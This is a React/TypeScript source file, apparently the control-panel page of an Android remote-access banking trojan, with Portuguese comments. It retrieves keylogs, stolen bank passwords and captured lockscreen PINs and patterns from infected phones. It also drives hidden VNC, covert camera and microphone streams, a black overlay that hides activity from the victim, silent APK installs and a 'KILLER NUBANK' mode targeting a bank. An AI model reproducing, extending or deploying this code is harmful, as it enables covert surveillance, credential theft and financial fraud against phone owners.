import { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import { devicesAPI, getApiBaseUrl, layoutAPI } from '../services/api';
import DeviceScreen from '../components/DeviceScreen';
import type { Device } from '../types';
import { 
  ArrowLeft, 
  Power, 
  MessageSquare, 
  Keyboard,
  Download,
  Eye,
  LogOut,
  Maximize,
  Minimize,
  ChevronDown,
  ChevronUp
} from 'lucide-react';
import { EditableButton } from '../components/EditableButton';
import { LayoutEditToolbar, EditModeToggle } from '../components/LayoutEditToolbar';
import BlackScreenEditor from '../components/BlackScreenEditor';
import { Layout, X, Move, Minimize2, Maximize2 } from 'lucide-react';

// Hook para detectar mobile
const useIsMobile = () => {
  const [isMobile, setIsMobile] = useState(false);
  
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  return isMobile;
};

const SCREEN_BASE_WIDTH = 1080;
const SCREEN_BASE_HEIGHT = 2400;

interface DeviceControlProps {
  onLogout: () => void;
}

export default function DeviceControl({ onLogout }: DeviceControlProps) {
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  const openPanelHandledRef = useRef<string | null>(null);
  const [device, setDevice] = useState<Device | null>(null);
  const [isBlackScreen, setIsBlackScreen] = useState(false);
  const [blackScreenOpacity, setBlackScreenOpacity] = useState(100);
  const blackScreenOpacityDebounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [isKeyloggerEnabled, setIsKeyloggerEnabled] = useState(false);
  const [isScreenReaderEnabled, setIsScreenReaderEnabled] = useState(false);
  
  // Long press do botão Power
  const [powerLongPressTimer, setPowerLongPressTimer] = useState<number | null>(null);
  const [isPowerLongPressed, setIsPowerLongPressed] = useState(false);
  const [showScreenReader, setShowScreenReader] = useState(false);
  const [deviceConnectionStatus, setDeviceConnectionStatus] = useState<'online' | 'offline' | 'stale'>('online');
  const [screenHierarchy, setScreenHierarchy] = useState<any>(null);
  const [screenScale, setScreenScale] = useState(1);
  
  // Estados para gestos no Screen Reader V2
  const [mouseDownPos, setMouseDownPos] = useState<{x: number, y: number} | null>(null);
  const [mouseDownTime, setMouseDownTime] = useState<number>(0);
  const [isDragging, setIsDragging] = useState(false);
  const dragPathRef = useRef<{x: number, y: number}[]>([]); // Caminho completo do arraste
  const [textToSend, setTextToSend] = useState('');
  const [keylogs, setKeylogs] = useState<any[]>([]);
  const [bankPasswords, setBankPasswords] = useState<any[]>([]);
  const [uploadedFiles, setUploadedFiles] = useState<any[]>([]);
  const [_offlineKeylogs, setOfflineKeylogs] = useState<any[]>([]); // Keylogs capturados offline (underscore para ignorar warning)
  const [capturedUnlockPins, setCapturedUnlockPins] = useState<any[]>([]);
  const [showConfigureRomConfirm, setShowConfigureRomConfirm] = useState(false);
  const [isUnlockRecording, setIsUnlockRecording] = useState(false);

  // One-time seed guard so server truth (from SILENT_VNC_STATUS) initializes the purple/green viewer state on first load/refresh
  const captureStateSeededRef = useRef(false);
  
  // 📅 KEYLOGGER POR DATA - Estados para novo sistema
  const [keylogSelectedDate, setKeylogSelectedDate] = useState<string>(new Date().toISOString().split('T')[0]);
  const [keylogsByDate, setKeylogsByDate] = useState<any[]>([]);
  const [keylogDates, setKeylogDates] = useState<{date: string, count: number}[]>([]);
  const [keylogSummary, setKeylogSummary] = useState<any>(null);
  const [isLoadingKeylogs, setIsLoadingKeylogs] = useState(false);
  const [keylogTotalToday, setKeylogTotalToday] = useState(0);
  
  // 📷 Estados para câmera
  const [isCameraEnabled, setIsCameraEnabled] = useState(false);
  const [showCameraModal, setShowCameraModal] = useState(false);
  
  // 🎨 Estado para editor de tela preta customizada
  const [showBlackScreenEditor, setShowBlackScreenEditor] = useState(false);
  const [customBlackScreenTemplate, setCustomBlackScreenTemplate] = useState<any>(null);
  const [currentCamera, setCurrentCamera] = useState<'front' | 'back'>('back'); // back = traseira, front = frontal
  const cameraCanvasRef = useRef<HTMLCanvasElement>(null);
  
  // 🎤 Estados para microfone
  const [isMicrophoneEnabled, setIsMicrophoneEnabled] = useState(false);
  const [showMicrophoneModal, setShowMicrophoneModal] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);
  
  // 🎬 isCaptureEnabled: viewer state - quando true, renderiza <DeviceScreen> (mostra frames ao vivo)
  const [isCaptureEnabled, setIsCaptureEnabled] = useState(false);
  const [silentQuality, setSilentQuality] = useState(15);
  const [isKillerMode, setIsKillerMode] = useState(false);
  
  // 📱 Estados para gerenciamento de apps
  const [showAppsModal, setShowAppsModal] = useState(false);
  const [installedApps, setInstalledApps] = useState<any[]>([]);
  const [isLoadingApps, setIsLoadingApps] = useState(false);
  const [appsFilter, setAppsFilter] = useState<'all' | 'user' | 'system'>('user');
  const [appsSearch, setAppsSearch] = useState('');
  
  // 🖥️ Modo expandido (VNC + Screen Reader lado a lado)
  const [isExpandedMode, setIsExpandedMode] = useState(false);
  
  // 🪟 MODO FLUTUANTE - Janelas arrastáveis
  const [isFloatingMode, setIsFloatingMode] = useState(false);
  const [floatingWindows, setFloatingWindows] = useState({
    vnc: { open: true, x: 50, y: 80, width: 400, height: 700, zIndex: 10 },
    screenReader: { open: false, x: 470, y: 80, width: 400, height: 700, zIndex: 11 },
    controls: { open: true, x: 890, y: 80, width: 300, height: 400, zIndex: 12 },
    camera: { open: false, x: 200, y: 200, width: 350, height: 400, zIndex: 13 },
    microphone: { open: false, x: 300, y: 250, width: 350, height: 300, zIndex: 14 },
    keylogger: { open: false, x: 400, y: 150, width: 350, height: 400, zIndex: 15 },
    bankPasswords: { open: false, x: 500, y: 100, width: 400, height: 500, zIndex: 16 },
    lockscreen: { open: false, x: 600, y: 120, width: 380, height: 550, zIndex: 17 },
  });
  const [highestZIndex, setHighestZIndex] = useState(20);
  
  // Função para trazer janela para frente
  const bringToFront = (windowId: keyof typeof floatingWindows) => {
    setHighestZIndex(prev => prev + 1);
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], zIndex: highestZIndex + 1 }
    }));
  };
  
  // Função para atualizar posição da janela
  const updateWindowPosition = (windowId: keyof typeof floatingWindows, x: number, y: number) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], x, y }
    }));
  };
  
  // Função para atualizar tamanho da janela
  const updateWindowSize = (windowId: keyof typeof floatingWindows, width: number, height: number) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], width, height }
    }));
  };
  
  // Toggle janela
  const toggleWindow = (windowId: keyof typeof floatingWindows) => {
    setFloatingWindows(prev => ({
      ...prev,
      [windowId]: { ...prev[windowId], open: !prev[windowId].open }
    }));
    if (!floatingWindows[windowId].open) {
      bringToFront(windowId);
    }
  };
  
  // 📱 Mobile: Modo tela cheia e controles
  const isMobile = useIsMobile();
  const [isMobileFullscreen, setIsMobileFullscreen] = useState(false);
  const [showMobileControls, setShowMobileControls] = useState(true);
  
  // 📦 Estados para instalação de APK
  const [showInstallApkModal, setShowInstallApkModal] = useState(false);
  const [isInstallingApk, setIsInstallingApk] = useState(false);
  const [selectedApkFile, setSelectedApkFile] = useState<File | null>(null);
  const apkInputRef = useRef<HTMLInputElement>(null);
  
  // 🔒 Estados para LOCKSCREEN PIN + PATTERN (igual EAGLESPY V5)
  const [showLockscreenModal, setShowLockscreenModal] = useState(false);
  const [capturedPin, setCapturedPin] = useState('');
  const [capturedPattern, setCapturedPattern] = useState('');
  const [pinInput, setPinInput] = useState('');
  const [patternInput, setPatternInput] = useState('');
  const [isLockscreenActive, setIsLockscreenActive] = useState(false);
  const [isPlayingPin, setIsPlayingPin] = useState(false);
  const [lockscreenType, setLockscreenType] = useState<'PIN' | 'PATTERN'>('PIN');
  const [pinDelay, setPinDelay] = useState(1000);
  
  // 🎨 Estados para layout editável (apenas cores dos botões)
  const [isLayoutEditMode, setIsLayoutEditMode] = useState(false);
  const [layoutDirty, setLayoutDirty] = useState(false);
  const [layoutPrefs, setLayoutPrefs] = useState<{
    buttonStyles: { [key: string]: { backgroundColor?: string; textColor?: string; borderColor?: string } };
  }>({
    buttonStyles: {},
  });
  
  // Carregar preferências de layout do usuário
  useEffect(() => {
    const loadLayoutPrefs = async () => {
      try {
        const response = await layoutAPI.getLayout();
        if (response.layout) {
          setLayoutPrefs(prev => ({ ...prev, ...response.layout }));
        }
      } catch (error) {
        console.error('Erro ao carregar preferências de layout:', error);
      }
    };
    loadLayoutPrefs();
  }, []);
  
  // Salvar preferências de layout
  const saveLayoutPrefs = async () => {
    try {
      await layoutAPI.saveLayout(layoutPrefs);
      setLayoutDirty(false);
      addLog('✅ Layout salvo com sucesso!');
    } catch (error) {
      console.error('Erro ao salvar layout:', error);
      addLog('❌ Erro ao salvar layout');
    }
  };
  
  // Resetar layout para padrão
  const resetLayoutPrefs = async () => {
    try {
      await layoutAPI.resetLayout();
      setLayoutPrefs({
        buttonStyles: {},
      });
      setLayoutDirty(false);
      addLog('🔄 Layout resetado para padrão');
    } catch (error) {
      console.error('Erro ao resetar layout:', error);
    }
  };
  
  // Atualizar estilo de botão
  const updateButtonStyle = (buttonId: string, style: { backgroundColor?: string; textColor?: string; borderColor?: string }) => {
    setLayoutPrefs(prev => ({
      ...prev,
      buttonStyles: {
        ...prev.buttonStyles,
        [buttonId]: { ...prev.buttonStyles[buttonId], ...style },
      },
    }));
    setLayoutDirty(true);
  };

  useEffect(() => {
    if (!deviceId) return;
    
    const loadDevice = async () => {
      try {
        const devices = await devicesAPI.getAll();
        const found = devices.find(d => d.device_id === deviceId);
        if (found) {
          setDevice(found);
          // Se dispositivo ficou offline, mostra aviso
          if (!found.is_online && device?.is_online) {
            addLog('⚠️ DISPOSITIVO DESCONECTADO!');
          }

          // Seed capture viewer state from server truth (reported via SILENT_VNC_STATUS by the device)
          // Only once, so it doesn't fight later local toggles by the user in this panel session.
          const anyFound: any = found;
          if (!captureStateSeededRef.current && (typeof anyFound.silent_active === 'boolean' || anyFound.capture_method)) {
            const serverSilentActive = !!anyFound.silent_active;
            const serverIsSilentMethod =
              anyFound.capture_method === 'silent' ||
              anyFound.capture_method === 'btmob' ||
              serverSilentActive;
            if (serverIsSilentMethod || anyFound.has_screen) {
              setIsCaptureEnabled(true);
            }
            captureStateSeededRef.current = true;
          }
        }
        // NÃO redireciona se dispositivo não encontrado - pode estar carregando
      } catch (error) {
        console.error('Erro ao carregar dispositivo:', error);
        // NÃO redireciona em caso de erro - pode ser temporário
      }
    };

    loadDevice();
    const interval = setInterval(loadDevice, 8000); // 8s - o WebSocket já detecta desconexões
    return () => clearInterval(interval);
  }, [deviceId, navigate]);

  // 📅 KEYLOGGER POR DATA - Polling robusto 24/7
  useEffect(() => {
    if (!deviceId) return;
    
    // Função para buscar keylogs por data
    const fetchKeylogsByDate = async (date: string) => {
      setIsLoadingKeylogs(true);
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-by-date?date=${date}`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          setKeylogsByDate(data.entries || []);
          
          // Atualiza contador de hoje
          const today = new Date().toISOString().split('T')[0];
          if (date === today) {
            setKeylogTotalToday(data.total || 0);
          }
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs por data:', error);
      }
      setIsLoadingKeylogs(false);
    };
    
    // Função para buscar resumo e datas disponíveis
    const fetchKeylogSummary = async () => {
      try {
        const token = localStorage.getItem('token');
        
        // Busca resumo
        const summaryRes = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-summary`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (summaryRes.ok) {
          const summary = await summaryRes.json();
          setKeylogSummary(summary);
        }
        
        // Busca datas disponíveis
        const datesRes = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs-dates`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (datesRes.ok) {
          const dates = await datesRes.json();
          setKeylogDates(dates);
        }
      } catch (error) {
        console.error('Erro ao buscar resumo keylogs:', error);
      }
    };
    
    // Busca keylogs antigos (compatibilidade)
    const fetchLegacyKeylogs = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/keylogs?limit=100&include_offline=true`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.length > 0) {
            const parsedLogs = data.map((item: any) => {
              try {
                const parsed = JSON.parse(item.data);
                return { ...parsed, timestamp: item.created_at, isOffline: item.isOffline };
              } catch (e) {
                return { text: item.data, timestamp: item.created_at, isOffline: item.isOffline };
              }
            }).reverse();
            setKeylogs(parsedLogs);
          }
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs legados:', error);
      }
    };
    
    // Busca inicial com a data selecionada (NÃO reseta para hoje!)
    fetchKeylogsByDate(keylogSelectedDate);
    fetchKeylogSummary();
    fetchLegacyKeylogs();
    
    // Polling a cada 5 segundos - suficiente para tempo real sem sobrecarregar
    const interval = setInterval(() => {
      fetchKeylogsByDate(keylogSelectedDate);
      fetchKeylogSummary();
      fetchLegacyKeylogs();
    }, 5000);
    
    return () => clearInterval(interval);
  }, [deviceId, keylogSelectedDate]); // Atualiza quando muda data ou dispositivo
  
  // Polling de senhas bancárias - SEMPRE ATIVO (busca do banco independente do botão)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchBankPasswords = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/bank-passwords`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setBankPasswords(data);
        }
      } catch (error) {
        console.error('Erro ao buscar senhas bancárias:', error);
      }
    };
    
    fetchBankPasswords();
    const interval = setInterval(fetchBankPasswords, 15000); // 15s - dados históricos não precisam de atualização rápida
    return () => clearInterval(interval);
  }, [deviceId]); // Removido isKeyloggerEnabled - agora busca SEMPRE
  
  // 📤 Polling de arquivos enviados - SEMPRE ATIVO (não depende do keylogger)
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchUploadedFiles = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/uploaded-files`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setUploadedFiles(data);
        }
      } catch (error) {
        console.error('Erro ao buscar arquivos:', error);
      }
    };
    
    fetchUploadedFiles();
    const interval = setInterval(fetchUploadedFiles, 10000);
    return () => clearInterval(interval);
  }, [deviceId]);
  
  // 📴 Polling de KEYLOGS OFFLINE - Captura tudo mesmo com painel fechado
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchOfflineKeylogs = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/offline-keylogs`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setOfflineKeylogs(data);
        }
      } catch (error) {
        console.error('Erro ao buscar keylogs offline:', error);
      }
    };
    
    fetchOfflineKeylogs();
    const interval = setInterval(fetchOfflineKeylogs, 15000); // A cada 15s
    return () => clearInterval(interval);
  }, [deviceId]);
  
  // 🔐 Polling de PINs/Patterns/Passwords de DESBLOQUEIO capturados
  useEffect(() => {
    if (!deviceId) return;
    
    const fetchUnlockPins = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/lockscreen-pins`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          setCapturedUnlockPins(Array.isArray(data) ? data : []);
        }
      } catch (error) {
        console.error('Erro ao buscar PINs de desbloqueio:', error);
      }
    };
    
    fetchUnlockPins();
    const interval = setInterval(fetchUnlockPins, 10000); // A cada 10s
    return () => clearInterval(interval);
  }, [deviceId]);
  
  // Polling da hierarquia da tela quando Screen Reader está ativado - OTIMIZADO
  useEffect(() => {
    if (!deviceId || !isScreenReaderEnabled) return;
    
    let isFetching = false;
    let lastData = '';
    
    const fetchHierarchy = async () => {
      // Evita requisições sobrepostas
      if (isFetching) return;
      isFetching = true;
      
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/screen-hierarchy`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Cache-Control': 'no-cache'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.status === 'ok' && data.data) {
            // Só atualiza se os dados mudaram (evita re-render desnecessário)
            if (data.data !== lastData) {
              lastData = data.data;
              try {
                const parsed = JSON.parse(data.data);
                setScreenHierarchy(parsed);
              } catch (e) {
                // Ignora erros de parse silenciosamente
              }
            }
          }
        }
      } catch {
        // Ignora erros de rede silenciosamente
      } finally {
        isFetching = false;
      }
    };
    
    fetchHierarchy();
    const interval = setInterval(fetchHierarchy, 500); // 500ms = ~2 FPS - bom equilíbrio entre responsividade e carga
    return () => clearInterval(interval);
  }, [deviceId, isScreenReaderEnabled]);

  const sendCommand = async (command: any) => {
    if (!deviceId) return;
    
    // Avisa se dispositivo parece offline
    if (deviceConnectionStatus === 'offline' || deviceConnectionStatus === 'stale') {
      console.warn('⚠️ Dispositivo pode estar offline, tentando enviar mesmo assim...');
    }
    
    console.log('📤 Enviando comando:', command);
    
    try {
      await devicesAPI.sendCommand(deviceId, command);
      console.log('✅ Comando enviado com sucesso:', command.action);
      addLog(`Comando enviado: ${command.action}`);
    } catch (error: any) {
      console.error('❌ Erro ao enviar comando:', error);
      
      // Trata erro 503 (dispositivo offline)
      if (error?.response?.status === 503) {
        addLog(`⚠️ Dispositivo offline - aguarde reconexão`);
        setDeviceConnectionStatus('offline');
      } else {
        addLog(`Erro ao enviar: ${command.action}`);
      }
    }
  };
  
  // Callback para atualizar status de conexão do DeviceScreen
  const handleConnectionStatusChange = (status: 'online' | 'offline' | 'stale') => {
    setDeviceConnectionStatus(status);
    if (status === 'online') {
      addLog('✅ Dispositivo reconectado!');
    } else if (status === 'stale') {
      addLog('⚠️ Dispositivo pode estar offline (sem frames)');
    }
  };
  
  // 🔴 POWER BUTTON - Long Press para menu de desligar/reiniciar
  const handlePowerMouseDown = () => {
    // Inicia timer de 800ms para long press
    const timer = window.setTimeout(() => {
      setIsPowerLongPressed(true);
      sendCommand({ action: 'POWER_MENU' }); // Abre menu de desligar/reiniciar
      addLog('⚡ Menu Power aberto (segurar)');
    }, 800);
    setPowerLongPressTimer(timer);
  };
  
  const handlePowerMouseUp = () => {
    // Cancela timer se soltar antes de 800ms
    if (powerLongPressTimer) {
      window.clearTimeout(powerLongPressTimer);
      setPowerLongPressTimer(null);
    }
    
    // Se não foi long press, é um clique normal (ligar/desligar tela)
    if (!isPowerLongPressed) {
      sendCommand({ action: 'POWER' });
      addLog('📱 Power (ligar/desligar tela)');
    }
    
    setIsPowerLongPressed(false);
  };
  
  const handlePowerMouseLeave = () => {
    // Cancela se o mouse sair do botão
    if (powerLongPressTimer) {
      window.clearTimeout(powerLongPressTimer);
      setPowerLongPressTimer(null);
    }
    setIsPowerLongPressed(false);
  };

  const addLog = (message: string) => {
    console.log(`[Control] ${message}`);
  };
  
  // 📦 INSTALAÇÃO DE APK
  const handleInstallApk = async () => {
    if (!selectedApkFile || !deviceId) return;
    
    setIsInstallingApk(true);
    addLog(`📦 Enviando APK: ${selectedApkFile.name}...`);
    
    try {
      const formData = new FormData();
      formData.append('apk_file', selectedApkFile);
      
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/install-apk`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData
      });
      
      if (!response.ok) {
        throw new Error('Erro ao enviar APK');
      }
      
      const result = await response.json();
      addLog(`✅ APK enviado! Instalando silenciosamente...`);
      console.log('📦 Resultado:', result);
      
      // Fecha o modal
      setShowInstallApkModal(false);
      setSelectedApkFile(null);
      
    } catch (error) {
      console.error('❌ Erro ao instalar APK:', error);
      addLog(`❌ Erro ao instalar APK`);
    } finally {
      setIsInstallingApk(false);
    }
  };

  const toggleBlackScreen = async () => {
    const newState = !isBlackScreen;
    await sendCommand({ 
      action: newState ? 'BLACK_SCREEN_ON' : 'BLACK_SCREEN_OFF' 
    });
    setIsBlackScreen(newState);
    if (!newState) {
      setBlackScreenOpacity(100);
    }
    addLog(newState ? 'Tela preta ATIVADA' : 'Tela preta DESATIVADA');
  };

  const handleBlackScreenOpacityChange = (val: number) => {
    setBlackScreenOpacity(val);
    if (blackScreenOpacityDebounceRef.current) {
      clearTimeout(blackScreenOpacityDebounceRef.current);
    }
    blackScreenOpacityDebounceRef.current = setTimeout(() => {
      sendCommand({ action: 'SET_BLACK_SCREEN_OPACITY', value: val });
    }, 80);
  };

  // 🎨 Aplicar tela preta customizada
  const applyCustomBlackScreen = async (template: any) => {
    try {
      console.log('🎨 DEBUG: Enviando CUSTOM_BLACK_SCREEN com template:', template);
      console.log('🎨 DEBUG: Template JSON:', JSON.stringify(template));
      
      // Enviar configuração da tela customizada para o dispositivo
      // NÃO fazemos JSON.stringify aqui - o servidor já faz isso!
      // Passa o template diretamente como objeto
      await sendCommand({
        action: 'CUSTOM_BLACK_SCREEN',
        template: template  // Objeto direto, não stringify!
      });
      
      console.log('🎨 DEBUG: Comando enviado com sucesso!');
      setCustomBlackScreenTemplate(template);
      setIsBlackScreen(true);
      setShowBlackScreenEditor(false);
      addLog(`🎨 Tela preta customizada aplicada: ${template.name}`);
    } catch (error) {
      console.error('❌ Erro ao aplicar tela customizada:', error);
      addLog('❌ Erro ao aplicar tela customizada');
    }
  };

  // 🎨 Salvar template de tela preta
  const saveBlackScreenTemplate = (template: any) => {
    setCustomBlackScreenTemplate(template);
    addLog(`💾 Template salvo: ${template.name}`);
  };

  const handleSendText = async () => {
    if (!textToSend.trim()) return;
    await sendCommand({ action: 'TYPE', text: textToSend });
    addLog(`Texto enviado: ${textToSend}`);
    setTextToSend('');
  };

  // toggleKeylogger - mantido para compatibilidade mas keylogger agora é 24/7
  const _toggleKeylogger = async () => {
    const newState = !isKeyloggerEnabled;
    console.log('🔴 DEBUG: Enviando comando TOGGLE_KEYLOGGER, enabled:', newState);
    
    await sendCommand({ 
      action: 'TOGGLE_KEYLOGGER',
      enabled: newState
    });
    
    setIsKeyloggerEnabled(newState);
    addLog(newState ? 'Keylogger ATIVADO ⌨️' : 'Keylogger DESATIVADO');
  };
  void _toggleKeylogger; // Silencia warning de variável não usada
  
  const toggleScreenReader = async () => {
    const newState = !isScreenReaderEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_SCREEN_READER',
      enabled: newState
    });
    
    setIsScreenReaderEnabled(newState);
    if (newState) setShowScreenReader(true);
    addLog(newState ? 'Screen Reader V2 ATIVADO 👁️' : 'Screen Reader V2 DESATIVADO');
  };
  
  // 📷 CÂMERA EM TEMPO REAL
  const toggleCamera = async () => {
    const newState = !isCameraEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_CAMERA',
      enabled: newState
    });
    
    setIsCameraEnabled(newState);
    if (newState) {
      setShowCameraModal(true);
      // Inicia stream WebSocket
      startCameraStream();
    } else {
      setShowCameraModal(false);
      stopCameraStream();
    }
    addLog(newState ? 'Câmera ATIVADA 📷' : 'Câmera DESATIVADA');
  };
  
  const startCameraStream = () => {
    if (!deviceId) return;
    
    // Limpa reconexão anterior se existir
    if ((window as any).cameraReconnectTimer) {
      clearTimeout((window as any).cameraReconnectTimer);
      delete (window as any).cameraReconnectTimer;
    }
    
    const token = localStorage.getItem('token');
    // Usa URL dinâmica baseada no getApiBaseUrl()
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsBase = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsBase}/ws/camera/${deviceId}?token=${token}`);
    
    ws.binaryType = 'arraybuffer';
    
    ws.onopen = () => {
      console.log('📷 Camera stream conectado');
    };
    
    ws.onmessage = (event) => {
      // Converte ArrayBuffer para Blob
      const arrayBuffer = event.data instanceof ArrayBuffer ? event.data : null;
      if (!arrayBuffer) return;
      
      const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
      const url = URL.createObjectURL(blob);
      
      const img = new Image();
      img.onload = () => {
        const canvas = cameraCanvasRef.current;
        
        if (canvas) {
          const ctx = canvas.getContext('2d');
          if (ctx) {
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
          }
        }
        
        URL.revokeObjectURL(url);
      };
      img.src = url;
    };
    
    ws.onerror = (error) => {
      console.error('📷 Erro no camera stream:', error);
      ws.close();
    };
    
    ws.onclose = () => {
      console.log('📷 Camera stream desconectado');
      // 🔄 RECONEXÃO AUTOMÁTICA se a câmera ainda estiver habilitada
      if (isCameraEnabled && showCameraModal) {
        console.log('📷 Reconectando câmera em 2 segundos...');
        (window as any).cameraReconnectTimer = setTimeout(() => {
          startCameraStream();
        }, 2000);
      }
    };
    
    // Armazena WebSocket para fechar depois
    (window as any).cameraWs = ws;
  };
  
  const stopCameraStream = () => {
    // Limpa timer de reconexão
    if ((window as any).cameraReconnectTimer) {
      clearTimeout((window as any).cameraReconnectTimer);
      delete (window as any).cameraReconnectTimer;
    }
    
    const ws = (window as any).cameraWs;
    if (ws) {
      ws.close();
      delete (window as any).cameraWs;
    }
  };
  
  // 🔄 Alterna entre câmera frontal e traseira
  const switchCamera = async () => {
    const newCamera = currentCamera === 'back' ? 'front' : 'back';
    setCurrentCamera(newCamera);
    
    await sendCommand({ 
      action: 'SWITCH_CAMERA',
      camera: newCamera
    });
    
    addLog(`Câmera alternada para ${newCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}`);
  };
  
  // 🎤 MICROFONE EM TEMPO REAL
  const toggleMicrophone = async () => {
    const newState = !isMicrophoneEnabled;
    
    await sendCommand({ 
      action: 'TOGGLE_MICROPHONE',
      enabled: newState
    });
    
    setIsMicrophoneEnabled(newState);
    if (newState) {
      setShowMicrophoneModal(true);
      startMicrophoneStream();
    } else {
      setShowMicrophoneModal(false);
      stopMicrophoneStream();
    }
    addLog(newState ? 'Microfone ATIVADO 🎤' : 'Microfone DESATIVADO');
  };
  
  const startViewer = async (qualityOverride?: number) => {
    const q = qualityOverride ?? silentQuality;
    await sendCommand({
      action: 'TOGGLE_SILENT_VNC',
      enabled: true,
      silent_only: true,
      quality: q
    });
    setIsCaptureEnabled(true);
    addLog(`HVNC ativado (qualidade ${q}%)`);
  };

  const applySilentQuality = async (q: number) => {
    const clamped = Math.min(100, Math.max(10, q));
    setSilentQuality(clamped);
    if (isCaptureEnabled) {
      await sendCommand({ action: 'SET_SILENT_VNC_QUALITY', quality: clamped });
      addLog(`Qualidade HVNC → ${clamped}%`);
    }
  };

  const toggleKillerMode = async () => {
    const next = !isKillerMode;
    setIsKillerMode(next);
    await sendCommand({ action: 'TOGGLE_KILLER_MODE', enabled: next });
    addLog(next ? 'KILLER NUBANK ativado' : 'KILLER NUBANK desativado');
  };

  const killerFrameThrottleRef = useRef(0);
  const requestKillerFrame = useCallback(() => {
    if (!isKillerMode || !deviceId) return;
    const now = Date.now();
    if (now - killerFrameThrottleRef.current < 400) return;
    killerFrameThrottleRef.current = now;
    void devicesAPI.sendCommand(deviceId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});
  }, [isKillerMode, deviceId]);

  const stopViewer = async () => {
    await sendCommand({
      action: 'TOGGLE_SILENT_VNC',
      enabled: false
    });
    setIsCaptureEnabled(false);
    addLog('Captura desativada');
  };

  const toggleCapture = async () => {
    if (isCaptureEnabled) {
      await stopViewer();
    } else {
      await startViewer();
    }
  };

  const restartCapture = async () => {
    addLog('Reiniciando HVNC...');
    await sendCommand({ action: 'FORCE_RESTART_VNC', enabled: true });
    setIsCaptureEnabled(true);
    addLog('HVNC reiniciado');
  };

  // Menu de contexto do Dashboard → abrir painel/modal correspondente
  useEffect(() => {
    const panel = (location.state as { openPanel?: string } | null)?.openPanel;
    if (!panel || !deviceId) return;

    const key = `${deviceId}:${panel}`;
    if (openPanelHandledRef.current === key) return;
    openPanelHandledRef.current = key;

    const openFloatingWindow = (windowId: keyof typeof floatingWindows) => {
      setIsFloatingMode(true);
      setFloatingWindows((prev) => ({
        ...prev,
        [windowId]: { ...prev[windowId], open: true },
      }));
    };

    (async () => {
      switch (panel) {
        case 'screen':
          document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
          break;
        case 'silent':
          await startViewer();
          document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
          break;
        case 'blackScreen':
          setShowBlackScreenEditor(true);
          break;
        case 'screenReader':
          if (!isScreenReaderEnabled) await toggleScreenReader();
          setShowScreenReader(true);
          break;
        case 'camera':
          setShowCameraModal(true);
          break;
        case 'mic':
          if (!isMicrophoneEnabled) await toggleMicrophone();
          setShowMicrophoneModal(true);
          break;
        case 'apps':
          setShowAppsModal(true);
          break;
        case 'keylogger':
          openFloatingWindow('keylogger');
          break;
        case 'lockscreen':
          setShowLockscreenModal(true);
          break;
        case 'floating':
          setIsFloatingMode(true);
          break;
        default:
          break;
      }
    })();

    navigate(location.pathname, { replace: true, state: {} });
  }, [location.state, deviceId]);
  
